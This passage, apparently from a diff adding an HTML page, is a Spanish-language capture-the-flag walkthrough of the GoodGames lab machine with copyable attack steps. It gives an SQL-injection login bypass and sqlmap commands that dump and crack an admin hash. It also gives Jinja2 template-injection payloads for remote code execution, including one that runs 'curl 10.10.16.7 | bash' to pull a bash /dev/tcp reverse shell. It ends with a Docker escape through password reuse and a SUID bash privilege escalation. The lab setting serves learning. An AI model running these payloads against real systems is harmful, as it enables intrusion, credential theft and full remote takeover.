+          con <code style="color:var(--yellow)">-- -</code>. Como resultado, el servidor devuelve
+          el primer usuario de la tabla, que corresponde al <strong>administrador</strong>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="1' or 1=1-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLi PAYLOAD</span>
+        <div><span class="comment"># Campo email del formulario de login</span></div>
+        <div><span class="prompt">email: </span><span class="arg">1' or 1=1-- -</span></div>
+        <div><span class="prompt">password: </span><span class="arg">[cualquier valor]</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">LOGIN SUCCESSFUL</span></div>
+        <div><span class="o-white">WELCOME ADMIN</span></div>
+        <div>Redirecting you to profile page...</div>
+      </div>
+
+      <div class="cve-box">
+        <p class="cve-box-title">// ACCESO COMO ADMINISTRADOR CONFIRMADO</p>
+        <p>El bypass SQLi funciona y el servidor autentica al primer usuario de la base de datos:
+        <strong>admin</strong> con email <strong>admin@goodgames.htb</strong>. Se accede al perfil de
+        administrador donde se observa el Nick, email y fecha de unión. La aplicación no sanitiza los
+        inputs del formulario de login — vulnerabilidad crítica.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">REGISTRO DE CUENTA DE PRUEBA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Para poder interceptar un request legítimo con <strong>Burp Suite</strong>, se crea una
+          cuenta de prueba con credenciales conocidas. Esto permitirá capturar la request POST del
+          login y guardarla en <code style="color:var(--yellow)">request.txt</code> para
+          usar con sqlmap.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="test@gmail.com / test123">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">REGISTRO</span>
+        <div><span class="comment"># Credenciales de la cuenta de prueba</span></div>
+        <div><span class="prompt">email: </span><span class="arg">test@gmail.com</span></div>
+        <div><span class="prompt">password: </span><span class="arg">test123</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SQLMAP -->
+    <div class="section" id="sqlmap">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">sqlmap — Dump de Base de Datos</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">CAPTURA DE REQUEST CON BURP SUITE</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se configura <strong>Burp Suite</strong> como proxy y se realiza un login con la cuenta de
+          prueba. La request POST al endpoint <code style="color:var(--yellow)">/login</code> es
+          interceptada y guardada en un archivo <span class="hl-cyan">request.txt</span>. Esta request
+          contiene todos los headers necesarios que sqlmap utilizará para autenticarse y ejecutar las
+          inyecciones.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div class="o-white">POST /login HTTP/1.1</div>
+        <div>Host: 10.129.1.192</div>
+        <div>Content-Type: application/x-www-form-urlencoded</div>
+        <div>Content-Length: 38</div>
+        <div>Origin: http://10.129.1.192</div>
+        <div>&nbsp;</div>
+        <div><span class="o-yellow">email=test%40gmail.com&amp;password=test123</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">ENUMERACIÓN DE BASES DE DATOS</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt --dbs --batch">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">--dbs --batch</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[02:44:46] [INFO] retrieved: main</div>
+        <div>available databases [2]:</div>
+        <div>[*] <span class="o-cyan">information_schema</span></div>
+        <div>[*] <span class="o-green">main</span></div>
+        <div>&nbsp;</div>
+        <div>[02:45:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.1.192'</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">ENUMERACIÓN DE TABLAS EN BASE DE DATOS MAIN</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt -D main --tables --batch">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">main</span> <span class="flag">--tables --batch</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Database: <span class="o-yellow">main</span></div>
+        <div>[3 tables]</div>
+        <div>+---------------+</div>
+        <div>| <span class="o-green">user</span>          |</div>
+        <div>| blog          |</div>
+        <div>| blog_comments |</div>
+        <div>+---------------+</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">DUMP DE LA TABLA USER</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt -D main -T user -C name,email,id,password --dump --batch">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">main</span> <span class="flag">-T</span> <span class="arg">user</span> <span class="flag">-C</span> <span class="arg">name,email,id,password</span> <span class="flag">--dump --batch</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>+-------+--------------------+----+----------------------------------+</div>
+        <div>| name  | email              | id | password                         |</div>
+        <div>+-------+--------------------+----+----------------------------------+</div>
+        <div>| <span class="o-green">admin</span> | <span class="o-cyan">admin@goodgames.htb</span> |  1 | <span class="o-red">2b22337f218b2d82dfc3b6f77e7cb8ec</span> |</div>
+        <div>+-------+--------------------+----+----------------------------------+</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// HASH MD5 EXTRAÍDO</p>
+        <p>El campo <strong>password</strong> del administrador contiene un hash
+        <strong>MD5</strong> de 32 caracteres. MD5 es un algoritmo de hashing débil que no
+        usa salt, lo que facilita el crackeo mediante tablas rainbow o diccionarios online.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">CRACKEO DEL HASH CON CRACKSTATION</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se utiliza <strong>CrackStation</strong> (<code style="color:var(--yellow)">https://crackstation.net/</code>)
+          para crackear el hash MD5. CrackStation es una herramienta online que usa tablas
+          rainbow precalculadas con miles de millones de hashes. El hash
+          <span class="hl-red">2b22337f218b2d82dfc3b6f77e7cb8ec</span> es identificado
+          inmediatamente como <strong>MD5</strong> y el resultado es la contraseña en texto claro.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div>Hash: <span class="o-red">2b22337f218b2d82dfc3b6f77e7cb8ec</span></div>
+        <div>Type: <span class="o-yellow">md5</span></div>
+        <div>Result: <span class="o-green">superadministrator</span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// CONTRASEÑA OBTENIDA</p>
+        <p>Credenciales del administrador: <strong>admin@goodgames.htb</strong> /
+        <strong>superadministrator</strong>. Esta contraseña también se reutiliza en SSH del
+        host real, lo que demuestra el peligro del <strong>password reuse</strong>.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SSTI -->
+    <div class="section" id="ssti">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">SSTI — Flask Volt Admin Panel</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">AÑADIR HOST AL /ETC/HOSTS</span>
+      </div>
+      <div class="prose">
+        <p>
+          En el perfil de administrador de GoodGames se observa un ícono de tuerca (settings) que
+          redirige al dominio <span class="hl-cyan">internal-administration.goodgames.htb</span>.
+          Para que el navegador resuelva este dominio, se agrega la entrada al archivo
+          <code style="color:var(--yellow)">/etc/hosts</code>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nano /etc/hosts">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">HOSTS</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nano <span class="arg">/etc/hosts</span></span></div>
+        <div><span class="comment"># Agregar la siguiente línea:</span></div>
+        <div><span class="arg">10.129.1.192&nbsp;&nbsp;&nbsp; internal-administration.goodgames.htb</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">ACCESO AL PANEL FLASK VOLT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al navegar a <span class="hl-cyan">http://internal-administration.goodgames.htb/login</span>
+          se presenta el panel <strong>Flask Volt</strong> — un dashboard de administración
+          open-source basado en Flask. Se ingresa con las credenciales del administrador:
+          <code style="color:var(--yellow)">admin</code> /
+          <code style="color:var(--yellow)">superadministrator</code>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="admin / superadministrator">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FLASK VOLT</span>
+        <div><span class="prompt">Username: </span><span class="arg">admin</span></div>
+        <div><span class="prompt">Password: </span><span class="arg">superadministrator</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">14</div>
+        <span class="step-title">DETECCIÓN DE SSTI EN CAMPO FULL NAME</span>
+      </div>
+      <div class="prose">
+        <p>
+          En la sección <strong>Settings</strong> del panel se observa que el campo
+          <strong>Full Name</strong> refleja el input directamente en el perfil. Se prueba el
+          payload de detección de SSTI más básico para Jinja2:
+          <code style="color:var(--yellow)">{{7*7}}</code>. Si el motor de plantillas evalúa
+          la expresión en lugar de mostrarla como texto, el resultado debería ser <strong>49</strong>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="{{7*7}}">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSTI TEST</span>
+        <div><span class="comment"># Payload de detección en campo Full Name</span></div>
+        <div><span class="prompt">Full Name: </span><span class="arg">{{7*7}}</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="comment"># Resultado reflejado en el perfil:</span></div>
+        <div>Nick: <span class="o-green">49</span></div>
+        <div>admin</div>
+        <div>admin@goodgames.htb</div>
+      </div>
+
+      <div class="cve-box">
+        <p class="cve-box-title">// SSTI JINJA2 CONFIRMADO</p>
+        <p>El resultado <strong>49</strong> confirma que la aplicación evalúa expresiones Jinja2 sin
+        sanitizar. La función <code>render_template_string()</code> de Flask está procesando el
+        input del usuario directamente — esto permite ejecutar código Python arbitrario en el servidor.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">15</div>
+        <span class="step-title">VERIFICAR RCE CON HOSTNAME -I</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se utiliza el payload SSTI de PayloadsAllTheThings para Jinja2 que llama a
+          <code style="color:var(--yellow)">os.popen()</code> y ejecuta un comando del sistema.
+          Se prueba <code style="color:var(--yellow)">hostname -I</code> para verificar la
+          dirección IP del servidor.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('hostname -I').read() }}">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSTI RCE</span>
+        <div><span class="arg">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('hostname -I').read() }}</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Nick: <span class="o-green">172.19.0.2</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// DENTRO DE UN CONTENEDOR DOCKER</p>
+        <p>La IP <strong>172.19.0.2</strong> pertenece a una red Docker interna — confirma que el
+        servidor web corre dentro de un <strong>contenedor Docker</strong>. El host real estará
+        en <strong>172.19.0.1</strong> (el gateway de la red Docker).</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REVERSE SHELL -->
+    <div class="section" id="shell">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Reverse Shell — Acceso al Contenedor</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">16</div>
+        <span class="step-title">PREPARAR EL PAYLOAD DE REVERSE SHELL</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se crea un archivo <span class="hl-cyan">index.html</span> con el payload de reverse shell
+          en bash. Este archivo se servirá desde nuestra máquina y será descargado y ejecutado
+          por el servidor víctima mediante el SSTI.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nano index.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">BASH</span>
+        <div><span class="prompt">$ </span><span class="cmd">nano <span class="arg">index.html</span></span></div>
+        <div>&nbsp;</div>
+        <div><span class="comment">#!/bin/bash</span></div>
+        <div><span class="arg">bash -i &gt;&amp; /dev/tcp/10.10.16.7/443 0&gt;&amp;1</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">17</div>
+        <span class="step-title">SERVIDOR HTTP EN NUESTRA MÁQUINA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se levanta un servidor HTTP con Python3 para servir el archivo
+          <code style="color:var(--yellow)">index.html</code> en el puerto 80. El servidor víctima
+          lo descargará mediante <code style="color:var(--yellow)">curl</code> y lo pasará
+          directamente a <code style="color:var(--yellow)">bash</code>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="python3 -m http.server 80">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">HTTP SERVER</span>
+        <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-m</span> <span class="arg">http.server 80</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">18</div>
+        <span class="step-title">LISTENER NETCAT EN PUERTO 443</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="nc -nlvp 443">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NETCAT</span>
+        <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-nlvp</span> <span class="arg">443</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">19</div>
+        <span class="step-title">TRIGGER: CURL + BASH VÍA SSTI</span>
+      </div>
+      <div class="prose">
+        <p>
+          Primero se verifica la conectividad con un <code style="color:var(--yellow)">curl 10.10.16.7</code>
+          que descarga el index.html (Paso 24 en el PDF). Confirmada la conexión, se ejecuta
+          el payload final que descarga y ejecuta el reverse shell en un solo comando:
+          <code style="color:var(--yellow)">curl 10.10.16.7 | bash</code>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl 10.10.16.7 | bash').read() }}">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSTI → RCE</span>
+        <div><span class="arg">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl 10.10.16.7 | bash').read() }}</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="comment"># En el listener netcat:</span></div>
+        <div>listening on [any] 443 ...</div>
+        <div><span class="o-green">connect to [10.10.16.7] from (UNKNOWN) [10.129.1.192] 42254</span></div>
+        <div>bash: cannot set terminal process group (1): Inappropriate ioctl for device</div>
+        <div>bash: no job control in this shell</div>
+        <div><span class="o-yellow">root@3a453ab39d3d:/backend# whoami</span></div>
+        <div><span class="o-green">root</span></div>
+        <div>root@3a453ab39d3d:/backend#</div>
+      </div>
+
+      <div class="cve-box">
+        <p class="cve-box-title">// SHELL COMO ROOT — DENTRO DEL DOCKER</p>
+        <p>Se obtiene una shell como <strong>root</strong> dentro del contenedor Docker (hostname
+        <strong>3a453ab39d3d</strong>). Se puede navegar por el sistema de archivos del contenedor,
+        pero hay que escapar hacia el host real para obtener las flags.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- DOCKER ESCAPE -->
+    <div class="section" id="docker">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Docker Escape — Escalada al Host</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">20</div>
+        <span class="step-title">TTY ESTABLE Y ACCESO SSH AL HOST</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se estabiliza la shell con <code style="color:var(--yellow)">script /dev/null -c bash</code>.
+          Luego se determina la IP del host real usando <code style="color:var(--yellow)">route -n</code>,
+          que muestra el gateway de la red Docker: <strong>172.19.0.1</strong>. Se intenta SSH
+          al host con el usuario <strong>augustus</strong> reutilizando la contraseña
+          <span class="hl-yel">superadministrator</span> — y funciona.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="script /dev/null -c bash">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DOCKER SHELL</span>
+        <div><span class="prompt">root@3a453ab39d3d:/backend# </span><span class="cmd">script <span class="arg">/dev/null</span> <span class="flag">-c bash</span></span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh augustus@172.19.0.1">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH</span>
+        <div><span class="prompt">root@3a453ab39d3d:/home/augustus# </span><span class="cmd">ssh <span class="arg">augustus@172.19.0.1</span></span></div>
+        <div><span class="comment"># Password: superadministrator</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.</div>
+        <div>augustus@172.19.0.1's password: <span class="o-yellow">superadministrator</span></div>
+        <div>&nbsp;</div>
+        <div>Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">augustus@GoodGames:~$</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// PASSWORD REUSE — VECTOR CRÍTICO</p>
+        <p>La contraseña <strong>superadministrator</strong> extraída del hash MD5 de la base
+        de datos web también es la contraseña SSH del usuario <strong>augustus</strong> en el
+        host real. Este es el peligro del <strong>password reuse</strong>: una sola credencial
+        comprometida da acceso a múltiples sistemas.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">21</div>
+        <span class="step-title">TÉCNICA SUID BASH — COPIAR BASH AL HOME DE AUGUSTUS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Estando en el Docker como root, el directorio <code style="color:var(--yellow)">/home/augustus</code>
+          del contenedor es el mismo que el del host (volumen montado). Se copia
+          <code style="color:var(--yellow)">/bin/bash</code> al directorio home del usuario.
+          Luego, desde la sesión SSH en el host (como augustus), se vuelve al contenedor Docker
+          donde somos root para modificar los permisos del binario copiado.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cp /bin/bash .">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DOCKER — ROOT</span>
+        <div><span class="prompt">root@3a453ab39d3d:/home/augustus# </span><span class="cmd">cp <span class="arg">/bin/bash</span> <span class="arg">.</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">22</div>
+        <span class="step-title">CHOWN Y CHMOD 4755 — SETUID COMO ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Desde el Docker (somos root), se cambia el propietario del binario
+          <code style="color:var(--yellow)">bash</code> copiado a
+          <strong>root:root</strong> y se le asigna el bit <span class="hl-red">SUID</span>
+          con <code style="color:var(--yellow)">chmod 4755</code>. El bit SUID hace que el
+          binario se ejecute con los privilegios del propietario (root) independientemente de
+          quién lo lance.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="chown root:root bash && chmod 4755 bash">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">DOCKER — ROOT</span>
+        <div><span class="prompt">root@3a453ab39d3d:/home/augustus# </span><span class="cmd">chown <span class="arg">root:root bash</span></span></div>
+        <div><span class="prompt">root@3a453ab39d3d:/home/augustus# </span><span class="cmd">chmod <span class="arg">4755 bash</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>total 1148</div>
+        <div>-<span class="o-red">rwsr-xr-x</span> 1 root root 1168776 May 29 09:42 <span class="o-yellow">bash</span></div>
+        <div>-rw-r----- 1 root 1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 33 May 29 03:14 user.txt</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">23</div>
+        <span class="step-title">EXPLOTAR SUID — ./BASH -P → ROOT EN EL HOST</span>
+      </div>
+      <div class="prose">
+        <p>
+          Desde la sesión SSH como <strong>augustus</strong> en el host real, se ejecuta el
+          binario bash SUID con la flag <code style="color:var(--yellow)">-p</code> (privileged mode),
+          que preserva el UID efectivo del propietario del archivo (root) sin hacer drop de
+          privilegios. Obtenemos una shell como <span class="hl-red">root</span> en el host.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="./bash -p">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">HOST — AUGUSTUS</span>
+        <div><span class="prompt">augustus@GoodGames:~$ </span><span class="cmd">./bash <span class="flag">-p</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>./bash -p</div>
+        <div><span class="o-yellow">bash-5.0# whoami</span></div>
+        <div><span class="o-green">root</span></div>
+        <div>bash-5.0# cd /root</div>
+        <div>bash-5.0# ls</div>
+        <div><span class="o-cyan">root.txt</span></div>
+        <div>bash-5.0# cat root.txt</div>
+        <div><span class="o-red">a2d96b0e549b31519ceaa3e630d34104</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- FLAGS -->
+    <div class="section" id="flags">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Flags</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">24</div>
+        <span class="step-title">USER FLAG — /home/augustus/user.txt</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat /home/augustus/user.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LINUX</span>
+        <div><span class="prompt">bash-5.0# </span><span class="cmd">cat <span class="arg">/home/augustus/user.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">[user flag hash]</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">25</div>
+        <span class="step-title">ROOT FLAG — /root/root.txt</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat /root/root.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LINUX</span>
+        <div><span class="prompt">bash-5.0# </span><span class="cmd">cat <span class="arg">/root/root.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">a2d96b0e549b31519ceaa3e630d34104</span></div>
+      </div>
+
+      <div class="flags-grid">
+        <div class="flag-card">
+          <div class="flag-label">// USER FLAG</div>
+          <div class="flag-user">/home/augustus/user.txt</div>
+        </div>
+        <div class="flag-root-card">
+          <div class="flag-label">// ROOT FLAG</div>
+          <div class="flag-root">a2d96b0e549b31519ceaa3e630d34104</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX out.xml</div>
+          <div class="cmd-ref-desc">Escaneo completo de todos los puertos TCP con detección de servicios, versiones y scripts NSE.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> → Todos los 65,535 puertos</li>
+            <li><span>-sS</span> → SYN scan (sigiloso)</li>
+            <li><span>-sC</span> → Scripts NSE por defecto</li>
+            <li><span>-sV</span> → Detección de versión</li>
+            <li><span>--min-rate=5000</span> → Mínimo 5000 paquetes/seg</li>
+            <li><span>-oX</span> → Salida en formato XML</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">sqlmap</div>
+          <div class="cmd-ref-syntax">sqlmap -r request.txt -D &lt;db&gt; -T &lt;tabla&gt; --dump --batch</div>
+          <div class="cmd-ref-desc">Automatiza SQL Injection usando una request HTTP guardada desde Burp Suite para extraer datos de la base de datos.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-r request.txt</span> → Request HTTP capturada</li>
+            <li><span>--dbs</span> → Listar bases de datos</li>
+            <li><span>-D main --tables</span> → Listar tablas</li>
+            <li><span>-T user -C name,pass --dump</span> → Extraer columnas</li>
+            <li><span>--batch</span> → Respuesta automática sin prompts</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">SSTI Jinja2</div>
+          <div class="cmd-ref-syntax">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cmd').read() }}</div>
+          <div class="cmd-ref-desc">Payload SSTI para ejecutar comandos del sistema operativo en aplicaciones Flask/Jinja2 sin filtros de __builtins__.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>{{7*7}}</span> → Detección básica (→ 49)</li>
+            <li><span>hostname -I</span> → Verificar IP del servidor</li>
+            <li><span>curl IP | bash</span> → Ejecutar reverse shell</span></li>
+            <li><span>PayloadsAllTheThings</span> → Repositorio de payloads</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">Docker Escape — SUID</div>
+          <div class="cmd-ref-syntax">cp /bin/bash . → chown root:root bash → chmod 4755 bash → ./bash -p</div>
+          <div class="cmd-ref-desc">Técnica de escape de Docker aprovechando un volumen compartido entre el contenedor (root) y el host (usuario normal).</div>
+          <ul class="cmd-ref-flags">
+            <li><span>cp /bin/bash .</span> → Copiar bash al home montado</li>
+            <li><span>chown root:root</span> → Propietario root (desde Docker)</li>
+            <li><span>chmod 4755</span> → Asignar bit SUID</li>
+            <li><span>./bash -p</span> → Ejecutar en modo privilegiado</li>
+            <li><span>route -n</span> → Identificar IP del host (gateway)</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">SQL Injection (SQLi)</div>
+          <div class="glos-def"><strong>SQL Injection</strong> es una vulnerabilidad que ocurre cuando una aplicación incorpora datos del usuario directamente en queries SQL sin sanitizarlos. Un atacante puede insertar código SQL malicioso que altera la lógica de la query original. El payload <code>1' or 1=1-- -</code> cierra la cadena de texto con la comilla simple, añade una condición siempre verdadera y comenta el resto de la query, haciendo que el servidor autentique al primer usuario de la tabla sin verificar la contraseña.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">sqlmap</div>
+          <div class="glos-def"><strong>sqlmap</strong> es una herramienta open-source que automatiza la detección y explotación de vulnerabilidades de SQL Injection. Soporta múltiples técnicas de inyección (boolean-based, time-based, error-based, UNION-based, stacked queries) y puede dumpear bases de datos completas, leer archivos del sistema, e incluso ejecutar comandos. La flag <code>-r request.txt</code> permite usar una request HTTP completa capturada con Burp Suite, incluyendo todos los headers y cookies necesarios para la autenticación.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SSTI — Server Side Template Injection</div>
+          <div class="glos-def"><strong>SSTI (Server Side Template Injection)</strong> ocurre cuando el motor de plantillas de un servidor web procesa input del usuario como código de plantilla en lugar de texto literal. En Flask/Jinja2, la función <code>render_template_string()</code> es especialmente peligrosa si recibe input del usuario directamente, ya que Jinja2 puede acceder a objetos Python internos y ejecutar código arbitrario. La detección se hace con <code>{{7*7}}</code> — si responde 49, la aplicación evalúa la expresión.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Jinja2 — Motor de Plantillas</div>
+          <div class="glos-def"><strong>Jinja2</strong> es el motor de plantillas por defecto de Flask. Permite generar HTML dinámico usando expresiones entre dobles llaves <code>{{ }}</code> y estructuras de control entre <code>{% %}</code>. En condiciones normales, Jinja2 sanitiza el contexto de ejecución, pero cuando se usa <code>render_template_string()</code> con input no sanitizado, un atacante puede traversar la jerarquía de objetos Python para alcanzar módulos del sistema operativo como <code>os.popen()</code> y ejecutar comandos arbitrarios.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Docker — Contenedores y Escape</div>
+          <div class="glos-def"><strong>Docker</strong> es una plataforma de virtualización a nivel de sistema operativo que permite ejecutar aplicaciones en contenedores aislados. Aunque los contenedores proporcionan aislamiento, pueden ser vulnerables al "container escape" — escapar al sistema host. Una técnica común es aprovechar <strong>volúmenes montados</strong>: si el directorio home de un usuario del host está montado en el contenedor y tenemos root en el contenedor, podemos colocar un binario SUID en ese directorio que luego es ejecutable desde el host.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SUID — Set User ID</div>
+          <div class="glos-def">El bit <strong>SUID (Set User ID)</strong> es un permiso especial en Linux que hace que un ejecutable corra con los privilegios del propietario del archivo en lugar del usuario que lo ejecuta. Si un binario propiedad de <strong>root</strong> tiene el bit SUID activo (<code>chmod 4755</code>), cualquier usuario del sistema puede ejecutarlo con privilegios de root. Esto es un vector clásico de escalada de privilegios. La flag <code>-p</code> de bash activa el "privileged mode" que no descarta el UID efectivo heredado del SUID.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">MD5 — Algoritmo de Hashing Débil</div>
